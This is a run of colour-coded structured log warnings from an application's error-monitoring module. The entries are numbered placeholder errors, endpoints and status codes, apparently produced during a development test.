WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.940766Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m94[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4698'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_98[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m498[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.940816Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m94[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4699'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_99[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m499[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.940866Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m95[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4700'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_0[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m500[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.940916Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m95[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4701'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_1[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m501[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.940966Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m95[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4702'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_2[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m502[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.941014Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m95[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4703'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_3[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m503[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.941062Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m95[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4704'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_4[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m504[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.941110Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m95[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4705'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_5[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m505[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.941158Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m95[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4706'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_6[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m506[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.941207Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m95[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4707'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_7[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m507[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.941255Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m95[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4708'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_8[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m508[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.941303Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m95[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4709'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_9[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m509[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.941354Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m95[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4710'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_10[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m510[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.941409Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m95[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4711'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_11[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m511[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.941461Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m95[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4712'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_12[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m512[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.941513Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m95[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4713'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_13[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m513[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.941562Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m95[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4714'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_14[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m514[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.941611Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m95[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4715'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_15[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m515[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.941659Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m95[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4716'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_16[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m516[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.941707Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m95[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4717'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_17[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m517[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.941756Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m95[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4718'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_18[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m518[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.941804Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m95[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4719'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_19[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m519[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.941852Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m95[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4720'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_20[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m520[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.941904Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m95[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4721'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_21[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m521[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.941953Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m95[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4722'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_22[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m522[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.942002Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m95[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4723'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_23[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m523[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.942052Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m95[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4724'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_24[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m524[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.942101Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m95[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4725'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_25[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m525[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.942149Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m95[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4726'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_26[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m526[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.942200Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m95[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4727'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_27[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m527[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.942255Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m95[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4728'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_28[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m528[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.942352Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m95[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4729'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_29[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m529[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.942426Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m95[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4730'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_30[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m530[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.942483Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m95[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4731'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_31[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m531[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.942535Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m95[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4732'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_32[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m532[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.942585Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m95[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4733'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_33[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m533[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.942635Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m95[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4734'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_34[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m534[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.942684Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m95[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4735'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_35[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m535[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.942734Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m95[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4736'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_36[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m536[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.942782Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m95[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4737'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_37[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m537[0m
